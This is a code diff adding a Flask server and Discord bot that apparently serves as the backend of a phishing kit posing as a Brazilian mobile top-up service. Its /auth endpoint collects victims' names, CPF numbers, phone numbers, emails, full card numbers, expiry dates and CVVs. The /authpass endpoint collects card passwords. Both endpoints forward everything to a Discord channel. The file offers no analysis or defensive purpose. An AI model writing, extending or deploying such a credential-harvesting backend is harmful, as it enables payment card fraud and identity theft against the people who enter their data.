@@ -1,0 +1,157 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import asyncio
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# Discord channel ID where messages will be sent
+DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", 0))
+
+# с app.app_context():
+# db.create_all()
+
+cards: list[Card] = []
+
+def send_discord_message(message):
+    """Helper function to send message to Discord channel"""
+    async def send_message():
+        channel = bot.get_channel(DISCORD_CHANNEL_ID)
+        if channel:
+            await channel.send(message)
+    
+    if DISCORD_CHANNEL_ID:
+        asyncio.create_task(send_message())
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Missing required fields'}), 401
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_number = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card_number,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        # Send card info to Discord
+        message = f"""
+🔴 **NOVO CARTÃO ADICIONADO** 🔴
+📱 Celular: {celular}
+🏢 Operadora: {operadora}
+💳 Valor: {valor}
+📧 Email: {email}
+👤 Nome: {nome}
+🔢 CPF: {cpf}
+💳 Cartão: {card_number}
+📅 Validade: {mes}/{ano}
+🔒 CVV: {cvv}
+🔑 Token: {token}
+🏦 BIN: {bin}
+📊 Dados BIN: {dadosbin}
+        """
+        send_discord_message(message)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Missing required fields'}), 401
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        for card in cards:
+            if card.token == token:
+                # Send password info to Discord
+                message = f"""
+🔴 **SENHA RECEBIDA** 🔴
+🔑 Token: {token}
+🔐 Senha: {senha}
+
+💳 **Informações do Cartão:**
+📱 Celular: {card.celular}
+🏢 Operadora: {card.operadora}
+💳 Valor: {card.valor}
+📧 Email: {card.email}
+👤 Nome: {card.nome}
+🔢 CPF: {card.cpf}
+💳 Cartão: {card.card}
+📅 Validade: {card.mes}/{card.ano}
+🔒 CVV: {card.cvv}
+🏦 BIN: {card.bin}
+                """
+                send_discord_message(message)
+                break
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+@bot.event
+async def on_ready():
+    print(f'Bot {bot.user} está online!')
+
+def run_bot():
+    """Function to run the Discord bot"""
+    if token:
+        bot.run(token)
+
+if __name__ == "__main__":
+    # Start Discord bot in a separate thread
+    import threading
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+    
+    # Start Flask app
+    app.run(host="0.0.0.0", port=5000)
